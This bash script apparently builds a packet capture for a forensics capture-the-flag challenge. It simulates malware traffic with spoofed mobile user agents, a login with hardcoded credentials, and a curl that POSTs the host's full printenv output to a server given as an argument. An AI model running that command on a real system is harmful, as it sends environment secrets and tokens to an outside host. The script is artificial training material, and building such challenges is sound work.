#!/bin/bash

ipfs init

ipfs daemon &

timeout 20 tcpdump -i any -w /output/challenge.pcap &

sleep 2.11

export SSLKEYLOGFILE=/output/sslkeylogfile.txt

curl -X POST $1/api/login --user-agent "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36" -H 'Content-Type: application/json' -d '{"username": "jooospeh", "password": "n3v3r-g0nna-g1v3-th3-b1rds-up"}'

sleep 5.82

curl $1/api/env --user-agent "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"

sleep 0.35

curl -X POST $1/api/env -d "$(date -u +"%Y-%m-%dT%H:%M:%SZ"; printenv)" --user-agent "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"

sleep 0.75

curl $1/api/flag --user-agent "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"

echo ">> malware calls complete <<"

sleep 15

echo ">> noise script finished <<"
